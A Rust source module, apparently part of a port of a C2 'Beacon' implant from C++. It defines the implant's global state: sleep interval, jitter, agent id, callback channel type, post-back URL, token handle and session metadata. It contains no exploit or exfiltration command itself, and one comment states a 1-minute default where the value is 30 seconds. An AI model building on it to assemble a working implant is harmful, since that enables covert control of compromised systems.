//! Beacon 全局状态。
//! Beacon global state.
//!
//! C++ 源码使用进程全局变量（`sleep_time`、`jitter`、`agentid`、`bigsession`、`post_type`、`http_post_len`、`atoken`、……）。本模块镜像它们。因为主循环运行时 Beacon 会为任务/链接派生线程，这些值都加锁保护。
//! The C++ source uses process-global variables (`sleep_time`, `jitter`,
//! `agentid`, `bigsession`, `post_type`, `http_post_len`, `atoken`, ...).
//! This module mirrors them. Values are guarded because Beacon spawns
//! threads for jobs/links while the main loop runs.

use parking_lot::Mutex;
use std::sync::atomic::{AtomicBool, AtomicI32, AtomicU32, AtomicIsize, Ordering};

/// 默认值：每次 beacon 间隔 1 分钟。
/// Default, 1 minute between beacons.
pub static SLEEP_TIME: AtomicU32 = AtomicU32::new(1000 * 30 * 1);
/// 用于改变睡眠时间的抖动值。
/// Jitter value used to alter the sleep time.
pub static JITTER: AtomicU32 = AtomicU32::new(0);
/// Beacon 代理 id。
/// Beacon agent id.
pub static AGENT_ID: AtomicU32 = AtomicU32::new(0);
/// 我们如何回传数据（POST_HTTP / POST_DNS / POST_SMB / POST_TCP）。
/// How we post data (POST_HTTP / POST_DNS / POST_SMB / POST_TCP).
pub static POST_TYPE: AtomicU32 = AtomicU32::new(1); // POST_HTTP
/// 为 HTTP POST 通道排队的字节数。
/// Bytes queued for the HTTP POST channel.
pub static HTTP_POST_LEN: AtomicI32 = AtomicI32::new(0);
/// 我们是否为 DNS beacon（改变 `genagentid`）。
/// Whether we are a DNS beacon (alters `genagentid`).
pub static DNS_BEACON: AtomicBool = AtomicBool::new(false);

/// 我们回传数据的 URL/域名。
/// The URL/domain we post data back to.
pub static POST_URL: Mutex<Vec<u8>> = Mutex::new(Vec::new());

/// 全局令牌句柄（tokens.cpp 中的 `atoken`）。
/// Global token handle (tokens.cpp `atoken`).
pub static ATOKEN: AtomicIsize = AtomicIsize::new(0);

/// 线程计数（thread.cpp 中的 `threadcount`）。
/// Thread count (thread.cpp `threadcount`).
pub static THREAD_COUNT: AtomicU32 = AtomicU32::new(0);

/// `Builder` 的 nonce/计数器（build.cpp 中的 `nonce`）。
/// Nonce/counter for `Builder` (build.cpp `nonce`).
pub static NONCE: AtomicU32 = AtomicU32::new(1);

/// 主 OS 版本（metadata.cpp 中的 `majorVersion`）。
/// Major OS version (metadata.cpp `majorVersion`).
pub static MAJOR_VERSION: AtomicU32 = AtomicU32::new(0);

/// DNS beacon 全局字符串（channel_tcp.cpp）。
/// DNS beacon global strings (channel_tcp.cpp).
pub static DNSBEACON_PUTOUTPUT: Mutex<Vec<u8>> = Mutex::new(Vec::new());

/// 经 Base64 编码的会话元数据（metadata.cpp 中的 `bigsession`）。
/// Base64-encoded session metadata (metadata.cpp `bigsession`).
pub struct SessData {
    pub myid: i32,
    pub length: usize,
    pub data: [u8; 1024],
}

impl Default for SessData {
    fn default() -> Self {
        SessData {
            myid: 0,
            length: 0,
            data: [0u8; 1024],
        }
    }
}

pub static BIGSESSION: Mutex<SessData> = Mutex::new(SessData {
    myid: 0,
    length: 0,
    data: [0u8; 1024],
});

pub fn sleep_time() -> u32 {
    SLEEP_TIME.load(Ordering::SeqCst)
}
pub fn set_sleep_time(v: u32) {
    SLEEP_TIME.store(v, Ordering::SeqCst);
}
pub fn jitter() -> u32 {
    JITTER.load(Ordering::SeqCst)
}
pub fn set_jitter(v: u32) {
    JITTER.store(v, Ordering::SeqCst);
}
pub fn agentid() -> u32 {
    AGENT_ID.load(Ordering::SeqCst)
}
pub fn set_agentid(v: u32) {
    AGENT_ID.store(v, Ordering::SeqCst);
}
pub fn post_type() -> u32 {
    POST_TYPE.load(Ordering::SeqCst)
}
pub fn set_post_type(v: u32) {
    POST_TYPE.store(v, Ordering::SeqCst);
}
pub fn http_post_len() -> i32 {
    HTTP_POST_LEN.load(Ordering::SeqCst)
}
pub fn set_http_post_len(v: i32) {
    HTTP_POST_LEN.store(v, Ordering::SeqCst);
}
pub fn atoken() -> isize {
    ATOKEN.load(Ordering::SeqCst)
}
pub fn set_atoken(v: isize) {
    ATOKEN.store(v, Ordering::SeqCst);
}
